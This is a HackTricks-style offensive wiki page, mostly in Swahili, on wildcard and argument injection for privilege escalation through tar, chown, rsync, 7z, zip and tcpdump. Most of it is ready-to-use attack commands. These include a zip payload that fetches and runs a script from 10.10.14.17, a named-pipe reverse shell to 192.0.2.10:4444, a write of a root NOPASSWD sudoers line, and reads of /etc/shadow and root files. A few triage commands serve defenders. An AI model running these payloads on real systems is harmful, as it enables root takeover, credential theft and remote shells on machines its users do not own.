# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** hutokea wakati script yenye ruhusa za juu inaendesha Unix binary kama `tar`, `chown`, `rsync`, `zip`, `7z`, … na wildcard isiyo na quotes kama `*`.
> Kwa kuwa shell hupanua wildcard **kabla** ya kutekeleza binary, mshambulizi anayoweza kuunda files kwenye working directory anaweza kutengeneza filenames zinazoanza na `-` ili zitafsiriwe kama **options badala ya data**, hivyo kuingiza flags za kiholela au hata commands.
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa karibuni na detections za kisasa za 2023-2025.

## chown / chmod

Unaweza **kunakili owner/group au permission bits za file yoyote ya kiholela** kwa kutumia flag ya `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wakati root baadaye inatekeleza kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` imeingizwa, na kusababisha *faili zote* zinazolingana kurithi umiliki/ruhusa za `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute arbitrary commands by abusing the **checkpoint** feature:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Mara root anapoendesha mfano `tar -czf /root/backup.tgz *`, `shell.sh` inaendeshwa kama root.

### bsdtar / macOS 14+

`tar` ya kawaida kwenye macOS za hivi karibuni (inayotegemea `libarchive`) hai-tekelezi `--checkpoint`, lakini bado unaweza kufanikisha code-execution kwa kutumia bendera ya **--use-compress-program** inayokuruhusu kubainisha compressor ya nje.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wakati script yenye priviliji inapoendesha `tar -cf backup.tar *`, `/bin/sh` itaanzishwa.

---

## rsync

`rsync` inakuruhusu kubadili remote shell au hata remote binary kupitia command-line flags zinazoanza na `-e` au `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye ataweka kumbukumbu ya directory na `rsync -az * backup:/srv/`, flag iliyodungwa itazindua shell yako upande wa mbali.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata wakati privileged script *defensively* inaweka `--` kabla ya wildcard (ili kuzuia option parsing), format ya 7-Zip inasaidia **file list files** kwa kuweka `@` mwanzoni mwa filename. Kuichanganya hiyo na symlink hukuwezesha *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root itaendesha kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama orodha ya faili na itaacha, **ikichapisha yaliyomo kwenda stderr**.

Hii huendelea kufanya kazi kupitia `-- *` kwa sababu 7-Zip CLI inakubali wazi zote mbili filenames za kawaida na `@listfiles` kama positional inputs, hivyo filename halisi kama `@root.txt` bado hutendewa kwa njia maalum.

---

## zip

Kuna primitives mbili za vitendo sana wakati application inapitia filenames zinazodhibitiwa na user kwenda kwa `zip` (iwe kupitia wildcard au kwa kuorodhesha majina bila `--`).

- RCE via test hook: `-T` huwezesha “test archive” na `-TT <cmd>` hubadilisha tester na program yoyote ile (long form: `--unzip-command <cmd>`). Ikiwa unaweza kuinject filenames zinazoanza na `-`, gawanya flags katika filenames tofauti ili short-options parsing ifanye kazi:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Vidokezo
- Usijaribu jina la faili moja kama `'-T -TT <cmd>'` — short options huchambuliwa kila herufi kivyake na itashindwa. Tumia tokens tofauti kama ilivyoonyeshwa.
- Ikiwa slashes zinaondolewa kutoka kwenye majina ya faili na app, chota kutoka kwa bare host/IP (default path `/index.html`) na uhifadhi locally kwa `-O`, kisha execute.
- Unaweza kufanya debug ya parsing kwa `-sc` (show processed argv) au `-h2` (more help) ili kuelewa jinsi tokens zako zinavyotumiwa.

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem. The same bug class keeps appearing in:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Quick heuristics:

- `-- *` ni fix nzuri kwa zana nyingi za GNU, lakini **si** kwa `7z`/`7za` kwa sababu `@listfiles` huchakatwa tofauti.
- Kwa `zip`, tafuta wrappers zinazoorodhesha moja kwa moja majina ya faili yanayodhibitiwa na user; short-option splitting (`-T` + `-TT <cmd>`) bado hufanya kazi hata bila shell glob.
- Kwa `tcpdump`, zingatia sana wrappers zinazokuruhusu kudhibiti **majina ya faili za output**, **rotation settings**, au hoja za **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wakati restricted shell au vendor wrapper inapounda `tcpdump` command line kwa kuunganisha fields zinazodhibitiwa na user (kwa mfano, parameter ya "file name") bila strict quoting/validation, unaweza kuingiza ziada `tcpdump` flags. Mchanganyiko wa `-G` (time-based rotation), `-W` (limit number of files), na `-z <cmd>` (post-rotate command) hutoa arbitrary command execution kama user anayeendesha tcpdump (mara nyingi root kwenye appliances).

Preconditions:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (kwa mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper haisafishi spaces au tokens zilizo na `-` mwanzo katika field ya file name.

Classic PoC (inaendesha reverse shell script kutoka path inayoweza kuandikwa):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Maelezo:

- `-G 1 -W 1` inalazimisha kufanya rotate mara moja baada ya packet ya kwanza inayolingana.
- `-z <cmd>` inaendesha post-rotate command mara moja kwa kila rotation. Build nyingi huendesha `<cmd> <savefile>`. Ikiwa `<cmd>` ni script/interpreter, hakikisha ushughulikiaji wa argument unalingana na payload yako.

Toleo zisizo na removable media:

- Ikiwa una primitive nyingine yoyote ya kuandika files (kwa mfano, separate command wrapper inayoruhusu output redirection), dondosha script yako kwenye path inayojulikana na anza `-z /bin/sh /path/script.sh` au `-z /path/script.sh` kulingana na semantics za platform.
- Baadhi ya vendor wrappers hurotate kwenda maeneo yanayoweza kudhibitiwa na attacker. Ukiweza kuathiri rotated path (symlink/directory traversal), unaweza kuelekeza `-z` ili execute content unayodhibiti kikamilifu bila external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Masuala
- `*` glob na permissive patterns hu-constrain tu hoja ya kwanza ya `-w`. `tcpdump` inakubali `-w` options nyingi; ya mwisho ndiyo hushinda.
- Rule haifungi other options, kwa hiyo `-Z`, `-r`, `-V`, n.k. zinaruhusiwa.

Primitives
- Override destination path kwa `-w` ya pili (ya kwanza tu ndiyo hu-satisfy sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal ndani ya kwanza `-w` ili kutoroka mti uliowekwa vikwazo:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Lazimisha ownership ya pato kwa `-Z root` (huunda faili zinazomilikiwa na root popote):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Uandishi wa maudhui ya kiholela kwa kurudisha nyuma crafted PCAP kupitia `-r` (mfano, kuweka sudoers line):

<details>
<summary>Unda PCAP ambayo ina exact ASCII payload na uiandike kama root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Usomaji wa faili wowote/leak ya siri kwa `-V <file>` (hufasiri orodha ya savefiles). Error diagnostics mara nyingi hurudisha mistari, na hivyo kuvuja maudhui:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Marejeo

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
